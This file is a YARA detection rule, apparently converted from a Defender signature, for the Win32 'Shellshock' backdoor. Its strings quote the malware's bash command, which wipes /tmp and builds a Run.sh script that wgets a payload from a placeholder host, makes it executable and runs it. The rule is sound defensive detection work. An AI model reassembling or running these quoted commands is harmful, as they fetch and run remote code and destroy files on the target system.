rule Backdoor_Win32_Shellshock_C_2147691150_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Win32/Shellshock.C!CZ"
        threat_id = "2147691150"
        type = "Backdoor"
        platform = "Win32: Windows 32-bit platform"
        family = "Shellshock"
        severity = "Critical"
        info = "CZ: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/bash -c \"rm -rf /tmp/*;echo wget %s -O /tmp/China.Z-%s >> /tmp/Run.sh;echo echo By China.Z >> /tmp/Run.sh;echo chmod 777 /tmp/China.Z-%s >>" ascii //weight: 1
        $x_1_2 = " /tmp/Run.sh;echo /tmp/China.Z-%s >> /tmp/Run.sh;echo rm -rf /tmp/Run.sh >> /tmp/Run.sh;chmod 777 /tmp/Run.sh;/tmp/Run.sh" ascii //weight: 1
        $x_2_3 = "\\Projects\\Shellshock\\Release\\Shellshock.pdb" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_1_*))) or
            ((1 of ($x_2_*))) or
            (all of ($x*))
        )
}

